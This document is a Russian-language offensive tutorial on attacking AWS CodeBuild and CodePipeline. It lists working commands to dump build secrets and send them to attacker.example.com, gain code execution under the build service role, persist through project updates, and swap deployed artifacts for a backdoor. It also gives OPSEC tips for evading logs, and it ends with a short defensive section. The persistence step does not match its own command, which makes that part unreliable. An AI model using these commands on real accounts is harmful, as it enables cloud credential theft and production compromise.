## Задача

Мы разобрали CI на GitHub и GitLab. Но у AWS есть **свой** CI/CD внутри аккаунта: CodeBuild, CodePipeline, CodeDeploy. Его часто считают «доверенным», потому что он живёт внутри. Между тем роль CodeBuild почти всегда имеет доступ к секретам и другим сервисам аккаунта.

Цель урока: из права запустить сборку получить **выполнение произвольного кода** с ролью сервиса и вытащить секреты.

## Данные, с которыми работаем

Наша роль умеет `codebuild:StartBuild` на проекте `app-build`. Разберём модель:

- **CodeBuild** — управляемый раннер. Проект описывает источник, образ, переменные окружения, файл `buildspec.yml` и **сервисную роль**. Во время сборки раннер имеет доступ к переменным (в том числе секретам) и к роли.
- **CodePipeline** — оркестратор стадий (source → build → deploy).
- **CodeDeploy** — доставка на EC2/Lambda/ECS через `appspec.yml`.
- **Артефакты** — S3-бакет, через который стадии передают файлы.

Начинаем с инвентаризации:

```bash
$ aws codebuild list-projects
{"projects": ["app-build", "infra-deploy"]}
$ aws codebuild batch-get-projects --names app-build \
    --query 'projects[0].environment.environmentVariables'
[
  {"name":"NPM_TOKEN","type":"PLAINTEXT","value":"npm_xxxxxxxx"},
  {"name":"DB_PASSWORD","type":"PARAMETER_STORE","value":"/app/db/password"}
]
```

Проект несёт переменные окружения: `NPM_TOKEN` лежит открытым текстом, `DB_PASSWORD` подтягивается из Parameter Store (хранилище параметров AWS). Значит, во время сборки эти значения доступны процессу.

## Шаг 1: запускаем свою сборку с подменённым buildspec

Ключевая деталь — флаг `--buildspec-override`: он позволяет подменить файл сборки целиком. Мы не трогаем проект, а подсовываем свой сценарий, который выгружает переменные окружения:

```bash
$ aws codebuild start-build --project-name app-build \
    --buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - env | sort | base64 -w0 | curl -X POST --data-binary @- http://attacker.example.com/leak
      - aws sts get-caller-identity'
{"build": {"id": "app-build:abc-123", "status": "IN_PROGRESS"}}
```

`base64 -w0` кодирует переменные в одну строку — так их удобно утащить одним POST. Наш сервер `attacker.example.com` принимает их. Второй командой мы спрашиваем «кто я»:

```bash
$ aws codebuild batch-get-builds --ids app-build:abc-123 \
    --query 'builds[0].logs.{Group:groupName,Stream:streamName}'
{"Group": "/aws/codebuild/app-build", "Stream": "abc-123"}
```

В логе сборки видим результат `sts get-caller-identity`:

```json
{"Arn": "arn:aws:iam::111122223333:role/CodeBuildServiceRole"}
```

Мы выполнили код **от имени роли `CodeBuildServiceRole`**. Если роль широкая (частая практика — `AdministratorAccess` «чтобы сборка работала»), аккаунт практически захвачен.

## Шаг 2: закрепляемся через UpdateProject

Разовый запуск даёт RCE сейчас. Но если у нас есть `codebuild:UpdateProject`, можно зашить бэкдор **навсегда** — изменённый проект будет исполнять вредоносный buildspec при каждой сборке:

```bash
$ aws codebuild update-project --name app-build \
    --service-role arn:aws:iam::111122223333:role/CodeBuildAdmin
```

Теперь даже когда наша сессия закончится, следующая легитимная сборка отработает наш код.

## Полный прогон от начала до конца

1. `list-projects` → нашли `app-build`.
2. `batch-get-projects` → увидели переменные окружения (секреты).
3. `start-build --buildspec-override` → выгрузили env и выполнили код с ролью сервиса.
4. `update-project` → закрепили бэкдор в buildspec.

## Если StartBuild нет: подмена артефакта

Не всегда нужен запуск сборки. Если у тебя есть только `s3:PutObject` в **артефакт-бакет**, можно подменить уже собранный артефакт — пайплайн развернёт твой код при следующем запуске:

```bash
$ aws codepipeline get-pipeline --name app-pipeline \
    --query 'pipeline.stages[].actions[].configuration'
{"BucketName":"codepipeline-us-east-1-123456789","ObjectKey":"build/output.zip"}
$ zip -r backdoor.zip app/ backdoor.sh
$ aws s3 cp backdoor.zip s3://codepipeline-us-east-1-123456789/build/output.zip
upload: backdoor.zip to s3://.../build/output.zip
$ aws codepipeline start-pipeline-execution --name app-pipeline
{"pipelineExecutionId": "abc-123"}
```

Через несколько минут код развёрнут на прод-инфраструктуре. Дополнительно `get-pipeline` показывает `roleArn` каждой стадии — если это роль с доступом к проду, подмена артефакта даёт код в проде. А **CodeDeploy-хуки** (`appspec.yml`) исполняются на целевых инстансах от имени агента — подмена appspec даёт RCE на парке серверов.

## Если не сработало: обходы и тонкости

- **`iam:PassRole`.** Запуск сборки иногда требует передать роль CodeBuild. Право `iam:PassRole` на **более привилегированную** роль, чем твоя, — прямой путь к эскалации.
- **VPC-конфигурация.** CodeBuild может работать в VPC — тогда раннер видит внутренние сервисы (расширяет доступ), но без NAT нет выхода в интернет (усложняет эксфильтрацию).
- **Логи.** Твои `curl` с секретами останутся в CloudWatch Logs и S3 — для OPSEC лучше кодировать и чистить, но следы всё равно остаются.
- **Approval actions.** Ручное подтверждение блокирует автоматический запуск; ищи параллельные стадии без approval.
- **OIDC-связка.** Если GitHub Actions пушит в AWS через OIDC-доверие, а trust policy принимает `sub` без ограничения по репозиторию/ветке — любой форк может принять роль.

## Частые ошибки и подводные камни

- **Считать CI внутри AWS «доверенным».** CodeBuild часто менее защищён, чем внешний GitHub, потому что «внутри аккаунта».
- **Забыть, что `UpdateProject` даёт персистентность.** Изменённый buildspec — это бэкдор, который переживёт вашу сессию.
- **Игнорировать `iam:PassRole`.** Возможность передать роль более привилегированную, чем ваша, — прямой путь к эскалации.
- **Не проверить артефакт-бакет.** Подмена артефакта тише, чем запуск сборки, и разворачивает ваш код в проде.
- **Оставлять секреты в логах сборки.** Выгрузка env через `curl` шумна и легко детектится — для OPSEC лучше кодировать.

- **Не проверять CodeDeploy-хуки.** `appspec.yml` исполняется на целевых инстансах от имени агента — подмена даёт RCE на парке серверов.

## Что мы теперь знаем

- `codebuild:StartBuild` — почти всегда RCE с ролью сервиса.
- `--buildspec-override` позволяет выполнить свой сценарий в окружении сборки.
- Переменные окружения сборки содержат секреты (в том числе из SSM/Secrets Manager).
- `codebuild:UpdateProject` даёт персистентность — бэкдор в buildspec.
- `s3:PutObject` в артефакт-бакет = подмена развёртываемого кода.
- `iam:PassRole` на привилегированную роль — прямой путь к эскалации.

## Глазами защитника

Право `iam:PassRole` в CI ограничивают: сборке дают узкую роль без прав на прод, а прод-деплой требует отдельного approval. Источники сборок фиксируют (конкретный репозиторий и ветка), чтобы нельзя было подменить их на свои. `buildspec` ревьюят, как код, и запрещают секреты в нём — только через SSM/Secrets Manager.

Артефакт-бакеты и CodeArtifact закрывают, потому что подмена артефакта равносильна исполнению своего кода на следующем шаге. В CloudTrail следят за `UpdateProject`, `StartBuild` и изменениями `buildspec`/источника, особенно вне обычных часов и из незнакомых ролей. Изоляция окружений (dev/prod) не даёт одной скомпрометированной сборке дотянуться до прода.

## Частые вопросы

**Почему CodeBuild — это фактически RCE?**

CodeBuild исполняет `buildspec.yml` с произвольными командами от имени service role проекта. Право `codebuild:StartBuild` вместе с возможностью подменить источник или buildspec даёт выполнение своего кода с ролью пайплайна — а она часто имеет деплой-права.

**Что даёт UpdateProject атакующему?**

Можно переписать проект так, чтобы он тянул твой репозиторий или выполнял твои команды. Это не только разовый запуск, но и персистентность: пайплайн будет исполнять твой код при каждом триггере, а роль останется доступной.

**Что стоит забрать с раннера?**

Креды service role, переменные окружения, доступ к артефактам S3 и CodeArtifact, токены деплоя. Часто через них достаётся ключ к прод-аккаунту или к ECR, откуда можно подменить образы сервисов.

**Как обойти отсутствие StartBuild?**

Подменить артефакт в S3-бакете пайплайна или сделать коммит в ветку, которая триггерит сборку. Иногда достаточно изменить `buildspec` в репозитории, чтобы следующий запуск выполнил твой код.

**Как защититься?**

Ограничить `iam:PassRole`, аудировать buildspec и источники сборок, давать каждой сборке узкую роль, требовать approvals перед прод-стадией, изолировать артефакт-бакеты и проверять, кто может менять проекты пайплайна.

**Что если `StartBuild` есть, но подменить источник нельзя?**

Тогда используй `buildspecOverride` — CodeBuild позволяет указать альтернативный buildspec прямо в `StartBuild`, если роль проекта это разрешает. Это исполняет твой код без изменения самого проекта и его источника.

**Чем опасен артефакт-бакет?**

Если у тебя есть запись в него, ты можешь подменить артефакт между сборкой и деплоем, и продакшн развернёт твой код. Это тише, чем менять пайплайн, и не создаёт новых сущностей в аккаунте.

**Чем CodePipeline опаснее CodeBuild?**

Pipeline связывает источники, сборку и деплой в одну цепочку с несколькими ролями. Подмена на любом этапе даёт доступ к роли этого этапа, а иногда и к прод-деплою целиком.

**Как быстро понять, что можно исполнить код в пайплайне?**

Проверь права `codebuild:StartBuild`, `codebuild:UpdateProject`, `iam:PassRole`. Любого из них вместе с доступом к проекту обычно достаточно, чтобы выполнить свою команду с ролью сборки.
